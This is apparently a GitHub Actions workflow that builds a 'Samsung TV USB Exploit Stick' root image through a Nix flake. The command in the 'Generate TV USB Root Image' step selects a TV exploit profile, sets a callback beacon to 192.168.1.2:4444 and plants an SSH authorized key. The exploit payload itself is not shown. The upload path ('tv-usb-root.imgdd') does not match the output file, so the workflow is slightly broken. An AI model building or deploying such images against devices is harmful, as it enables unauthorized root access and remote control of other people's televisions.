name: build_usb_stick

on:
  workflow_dispatch:

jobs:
  build_usb:
    name: Build Samsung TV USB Exploit Stick
    runs-on: ubuntu-latest
    timeout-minutes: 20
    steps:
      - uses: actions/checkout@v4
      
      - name: Install Nix
        uses: cachix/install-nix-action@v27
        with:
          nix_path: nixpkgs=channel:nixos-unstable
          
      - name: Generate TV USB Root Image
        run: |
          nix --extra-experimental-features "nix-command flakes" run . -- --exploit-profile tv --beacon 192.168.1.2:4444 --authorized-keys ~/.ssh/id_ed25519.pub --out out/tv-usb-root.img --force
          
      - uses: actions/upload-artifact@v4
        with:
          name: final-tv-usb-stick
          path: out/tv-usb-root.imgdd
